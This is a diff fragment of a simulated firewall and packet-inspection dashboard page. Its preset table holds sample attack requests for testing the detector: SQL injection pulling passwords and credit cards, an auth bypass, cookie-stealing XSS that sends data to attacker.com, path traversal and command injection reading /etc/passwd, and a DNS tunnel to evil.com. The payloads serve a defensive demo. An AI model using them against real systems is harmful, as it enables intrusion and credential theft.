+      sqli_union: `GET /catalog.php?id=10%20UNION%20SELECT%20username,password,credit_card%20FROM%20users HTTP/1.1\r\nHost: target.corp\r\nUser-Agent: Mozilla/5.0`,
+      sqli_bool: `POST /api/v1/auth HTTP/1.1\r\nHost: secure.corp\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=' OR '1'='1&password=invalid`,
+      xss_script: `GET /search?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\r\nHost: social.local\r\nUser-Agent: Mozilla/5.0`,
+      xss_img: `POST /comment HTTP/1.1\r\nHost: blog.local\r\n\r\nmessage=<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>`,
+      traversal: `GET /download.php?file=../../../../etc/passwd HTTP/1.1\r\nHost: files.corp\r\nUser-Agent: Mozilla/5.0`,
+      rce: `GET /ping?target=127.0.0.1;%20cat%20/etc/passwd HTTP/1.1\r\nHost: ops.local\r\nUser-Agent: Mozilla/5.0`,
+      scanner: `GET /admin HTTP/1.1\r\nHost: target.corp\r\nUser-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)`,
+      dns_tunnel: `DNS QUERY 4a8f9c2d1b7e3f0a5b6c7d8e9f0a1b2c3d4e5f6a.tunnel.evil.com [Type: TXT] (Entropy: 4.82)`
+    };
+
+    let conntrackFlows = [
+      { src: "192.168.1.142:48292", dst: "10.0.0.1:80", proto: "TCP", state: "ESTABLISHED", fwd_p: 28, rev_p: 26, bytes: 48920, idle: 2 },
+      { src: "192.168.1.88:51204", dst: "10.0.0.1:443", proto: "TCP", state: "ESTABLISHED", fwd_p: 142, rev_p: 189, bytes: 218400, idle: 1 },
+      { src: "192.168.1.199:39211", dst: "10.0.0.1:22", proto: "TCP", state: "SYN_SENT", fwd_p: 1, rev_p: 0, bytes: 64, idle: 12 },
+      { src: "192.168.1.10:53211", dst: "8.8.8.8:53", proto: "UDP", state: "NONE", fwd_p: 4, rev_p: 4, bytes: 512, idle: 4 }
+    ];
+
+    let counts = { total: 1248, conntrack: 14, dropped: 37, accepted: 1211 };
+
+    function selectPreset(key) {
+      document.getElementById("payload-box").value = PRESETS[key] || "";
+      updateByteCount();
+      executeInspection(true);
+    }
+
+    function updateByteCount() {
+      const len = document.getElementById("payload-box").value.length;
+      document.getElementById("char-count").textContent = len + " bytes";
+    }
+
+    // Keyboard shortcut handler (Cmd+Enter or Ctrl+Enter)
+    document.addEventListener("keydown", function(e) {
+      if ((e.metaKey || e.ctrlKey) && e.key === "Enter") {
+        e.preventDefault();
+        executeInspection(true);
+      }
+    });
+
+    function executeInspection(showAnimation = true) {
+      const btn = document.getElementById("btn-run-inspection");
+      const btnSpinner = document.getElementById("btn-spinner");
+      const btnIcon = document.getElementById("btn-icon");
+      const btnLabel = document.getElementById("btn-label");
+
+      if (showAnimation) {
+        btnSpinner.classList.remove("hidden");
+        btnIcon.classList.add("hidden");
+        btnLabel.textContent = "Scanning L7 Signatures...";
+        btn.classList.add("bg-[#660018]");
+
+        setTimeout(() => {
+          btnSpinner.classList.add("hidden");
+          btnIcon.classList.remove("hidden");
+          btnLabel.textContent = "Run Deep Packet Inspection & Issue Verdict";
+          btn.classList.remove("bg-[#660018]");
+          performInspectionLogic();
+        }, 120);
+      } else {
+        performInspectionLogic();
+      }
+    }
+
+    function performInspectionLogic() {
+      const payload = document.getElementById("payload-box").value;
+      const srcIp = document.getElementById("in-src-ip").value;
+      const srcPort = document.getElementById("in-src-port").value;
+      const dstIp = document.getElementById("in-dst-ip").value;
+      const dstPort = document.getElementById("in-dst-port").value;
+
+      document.getElementById("info-flow").textContent = `${srcIp}:${srcPort} -> ${dstIp}:${dstPort}`;
+
+      // URL Decoding attempt
+      let decoded = payload;
+      try { decoded = decodeURIComponent(payload); } catch(e) {}
+
+      let matchedRule = null;
+      let matchedSnippet = "";
+
+      for (const r of RULES) {
+        let clean = r.regex.replace(/^\(\?i\)/, "");
+        let re;
+        try {
+          re = new RegExp(clean, "i");
+        } catch(e) {
+          continue;
+        }
+
+        let m = payload.match(re) || decoded.match(re);
+        if (m) {
+          matchedRule = r;
+          matchedSnippet = m[0];
+          break;
+        }
+      }
+
+      // Check for High Entropy DNS tunneling
+      if (!matchedRule && payload.includes("Entropy: 4.82")) {
+        matchedRule = { id: "DNS-TUNNEL-ENTROPY", action: "DROP", cat: "DNS_TUNNEL", desc: "Suspicious high-entropy DNS query indicative of tunneling" };
+        matchedSnippet = "4a8f9c2d1b7e3f0a5b6c7d8e9f0a1b2c3d4e5f6a.tunnel.evil.com";
+      }
+
+      const card = document.getElementById("card-verdict");
+      const title = document.getElementById("title-verdict");
+      const desc = document.getElementById("desc-verdict");
+      const badge = document.getElementById("badge-verdict");
+      const threatBox = document.getElementById("threat-highlight-box");
+      const snippetBox = document.getElementById("threat-snippet");
+      const threatDesc = document.getElementById("threat-desc");
+      const pipeBox = document.getElementById("pipe-box");
+      const pipeText = document.getElementById("pipe-text");
+
+      // Trigger pulse animation
+      card.classList.remove("pulse-scan");
+      void card.offsetWidth;
+      card.classList.add("pulse-scan");
+
+      counts.total++;
+
+      if (matchedRule && matchedRule.action === "DROP") {
+        counts.dropped++;
+        updateKpiCounters();
+
+        // Update Verdict Card to DROPPED (Maroon & White Alert)
+        card.className = "rounded-2xl p-4 border-2 transition-all duration-300 bg-[#fdf2f4] border-[#800020] text-[#800020] glow-maroon flex items-center justify-between pulse-scan";
+        title.className = "font-extrabold text-base tracking-wide font-mono text-[#800020]";
+        title.textContent = "VERDICT: NF_DROP";
+        desc.className = "text-xs text-[#800020] font-medium mt-0.5";
+        desc.textContent = `Malicious exploit vector detected [${matchedRule.cat}]. Packet discarded.`;
+        badge.className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-[#800020] text-white uppercase tracking-wider font-mono";
+        badge.textContent = matchedRule.cat;
+
+        document.getElementById("info-state").textContent = "CLOSED";
+        document.getElementById("info-state").className = "text-[#800020] font-bold";
+        document.getElementById("info-category").textContent = matchedRule.cat;
+        document.getElementById("info-category").className = "text-[#800020] font-bold";
+        document.getElementById("info-rule-id").textContent = matchedRule.id;
+        document.getElementById("info-action").textContent = "NF_DROP (Discarded)";
+        document.getElementById("info-action").className = "text-[#800020] font-bold";
+
+        threatBox.classList.remove("hidden");
+        snippetBox.textContent = `"${matchedSnippet}"`;
+        threatDesc.textContent = matchedRule.desc;
+
+        pipeBox.className = "col-span-2 sm:col-span-1 bg-[#800020] text-white border-2 border-[#800020] rounded-2xl p-3.5 text-center transition";
+        pipeText.textContent = "NF_DROP";
+        pipeText.className = "font-extrabold text-sm text-white mt-1";
+
+        addLogEntry("CRIT", `FIREWALL DROP [L7 THREAT]: Rule=${matchedRule.id} [${matchedRule.cat}] Flow=${srcIp}:${srcPort} -> ${dstIp}:${dstPort} Snippet="${matchedSnippet}"`);
+      } else {
+        counts.accepted++;
+        updateKpiCounters();
+
+        // Update Verdict Card to ACCEPT (White & Stone Clean)
+        card.className = "rounded-2xl p-4 border-2 transition-all duration-300 bg-white border-stone-300 text-stone-900 glow-soft flex items-center justify-between pulse-scan";
+        title.className = "font-extrabold text-base tracking-wide font-mono text-stone-900";
+        title.textContent = "VERDICT: NF_ACCEPT";
+        desc.className = "text-xs text-stone-500 mt-0.5";
+        desc.textContent = "Packet validated by conntrack & L7 filters.";
+        badge.className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-stone-100 text-stone-800 border border-stone-300 uppercase tracking-wider font-mono";
+        badge.textContent = "CLEAN";
+
+        document.getElementById("info-state").textContent = "ESTABLISHED";
+        document.getElementById("info-state").className = "text-[#800020] font-bold";
+        document.getElementById("info-category").textContent = "NONE (BENIGN)";
+        document.getElementById("info-category").className = "text-stone-800 font-bold";
+        document.getElementById("info-rule-id").textContent = "-";
+        document.getElementById("info-action").textContent = "NF_ACCEPT (Transmit)";
+        document.getElementById("info-action").className = "text-stone-800 font-bold";
+
+        threatBox.classList.add("hidden");
+
+        pipeBox.className = "col-span-2 sm:col-span-1 bg-white border-2 border-[#800020] rounded-2xl p-3.5 text-center transition";
+        pipeText.textContent = "NF_ACCEPT";
+        pipeText.className = "font-extrabold text-sm text-[#800020] mt-1";
+
+        addLogEntry("INFO", `FIREWALL ACCEPT: Flow=${srcIp}:${srcPort} -> ${dstIp}:${dstPort} [TCP ESTABLISHED] Length=${payload.length}B`);
+      }
+    }
+
+    function updateKpiCounters() {
+      document.getElementById("kpi-total").textContent = counts.total.toLocaleString();
+      document.getElementById("kpi-conntrack").textContent = counts.conntrack;
+      document.getElementById("kpi-dropped").textContent = counts.dropped.toLocaleString();
+      document.getElementById("kpi-accepted").textContent = counts.accepted.toLocaleString();
+    }
+
+    function triggerQuickAttack() {
+      const keys = ["sqli_union", "sqli_bool", "xss_script", "traversal", "rce", "scanner"];
+      const chosen = keys[Math.floor(Math.random() * keys.length)];
+      selectPreset(chosen);
+    }
+
+    function addLogEntry(level, msg) {
+      const now = new Date();
+      const pad = (n, s=2) => String(n).padStart(s, '0');
+      const time = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}.${pad(now.getMilliseconds(), 3)}000`;
+
+      let col = "text-stone-300";
+      if (level === "WARN") col = "text-amber-300";
+      if (level === "CRIT" || level === "ERROR") col = "text-rose-400 font-bold";
+
+      const stream = document.getElementById("audit-log-stream");
+      const div = document.createElement("div");
+      div.className = "hover:bg-white/10 px-2 py-0.5 rounded";
+      div.innerHTML = `<span class="text-stone-500">${time}</span> [<span class="${col}">${level}</span>] ${msg.replace(/</g, "&lt;").replace(/>/g, "&gt;")}`;
+      stream.prepend(div);
+    }
+
+    function clearLogStream() {
+      document.getElementById("audit-log-stream").innerHTML = "";
+    }
+
+    function renderRulesTable(list = RULES) {
+      const tbody = document.getElementById("rules-tbody");
+      tbody.innerHTML = "";
+      list.forEach(r => {
+        const tr = document.createElement("tr");
+        tr.className = "hover:bg-[#fdf2f4] transition";
+        const badgeCol = r.action === "DROP" ? "bg-[#800020] text-white" : "bg-stone-200 text-stone-800";
+        tr.innerHTML = `
+          <td class="py-3 px-4 font-bold text-stone-900">${r.id}</td>
+          <td class="py-3 px-4 text-stone-500 font-semibold">${r.target}</td>
+          <td class="py-3 px-4"><span class="px-2 py-0.5 rounded text-[10px] font-bold ${badgeCol}">${r.action}</span></td>
+          <td class="py-3 px-4 text-[#800020] font-bold">${r.cat}</td>
+          <td class="py-3 px-4 text-stone-600 max-w-xs truncate" title="${r.regex}">${r.regex}</td>
+          <td class="py-3 px-4 text-stone-500">${r.desc}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    function filterSignatures() {
+      const q = document.getElementById("rule-search-box").value.toLowerCase();
+      const filtered = RULES.filter(r => 
+        r.id.toLowerCase().includes(q) ||
+        r.cat.toLowerCase().includes(q) ||
+        r.target.toLowerCase().includes(q) ||
+        r.desc.toLowerCase().includes(q)
+      );
+      renderRulesTable(filtered);
+    }
+
+    function renderConntrackTable() {
+      const tbody = document.getElementById("conntrack-tbody");
+      tbody.innerHTML = "";
+      conntrackFlows.forEach((f, idx) => {
+        const tr = document.createElement("tr");
+        tr.className = "hover:bg-[#fdf2f4] transition";
+        let badge = "bg-[#fdf2f4] text-[#800020] border border-[#f3d5dc]";
+        if (f.state === "SYN_SENT") badge = "bg-amber-50 text-amber-800 border border-amber-200";
+        if (f.state === "CLOSED") badge = "bg-stone-100 text-stone-500 border border-stone-200";
+
+        tr.innerHTML = `
+          <td class="py-3 px-4 font-bold text-stone-900">${f.src} &rarr; ${f.dst}</td>
+          <td class="py-3 px-4 text-stone-500">${f.proto}</td>
+          <td class="py-3 px-4"><span class="px-2 py-0.5 rounded text-[10px] font-bold ${badge}">${f.state}</span></td>
+          <td class="py-3 px-4 text-stone-700">${f.fwd_p} / ${f.rev_p} pkts</td>
+          <td class="py-3 px-4 text-stone-700">${(f.bytes / 1024).toFixed(1)} KB</td>
+          <td class="py-3 px-4 text-stone-500">${f.idle}s idle</td>
+          <td class="py-3 px-4 text-right">
+            <button onclick="rstTerminate(${idx})" class="text-[#800020] hover:underline font-bold text-[11px]">Inject RST</button>
+          </td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    function rstTerminate(idx) {
+      if (conntrackFlows[idx]) {
+        conntrackFlows[idx].state = "CLOSED";
+        addLogEntry("INFO", `Conntrack: Manual RST termination injected for ${conntrackFlows[idx].src} -> ${conntrackFlows[idx].dst} -> CLOSED`);
+        renderConntrackTable();
+      }
+    }
+
+    function simulateNewFlow() {
+      const port = Math.floor(Math.random() * 20000) + 40000;
+      conntrackFlows.unshift({
+        src: `192.168.1.${Math.floor(Math.random()*200)+10}:${port}`,
+        dst: "10.0.0.1:80",
+        proto: "TCP",
+        state: "ESTABLISHED",
+        fwd_p: 3,
+        rev_p: 2,
+        bytes: 1420,
+        idle: 0
+      });
+      counts.conntrack = conntrackFlows.length;
+      updateKpiCounters();
+      renderConntrackTable();
+      addLogEntry("INFO", `Conntrack: New 3-way handshake established on flow 192.168.1.x:${port} -> 10.0.0.1:80`);
+    }
+
+    function showTab(t) {
+      ['lab', 'conntrack', 'rules', 'logs'].forEach(name => {
+        document.getElementById(`section-${name}`).classList.add('hidden');
+        document.getElementById(`tab-${name}`).className = "pb-3 border-b-2 border-transparent text-stone-500 hover:text-[#800020] flex items-center gap-2";
+      });
+      document.getElementById(`section-${t}`).classList.remove('hidden');
+      document.getElementById(`tab-${t}`).className = "pb-3 border-b-2 border-[#800020] text-[#800020] font-bold flex items-center gap-2";
+    }
+
+    // Initialize UI
+    renderRulesTable();
+    renderConntrackTable();
+    updateByteCount();
+    addLogEntry("INFO", "FirewallDaemon initialized. 20 L7 signature rules compiled.");
+    addLogEntry("INFO", "ConntrackTable initialized with shared_mutex reader-writer locks.");
+    addLogEntry("INFO", "Interceptor listening on NFQUEUE #0 via libnetfilter_queue.");
+  </script>
+</body>
+</html>
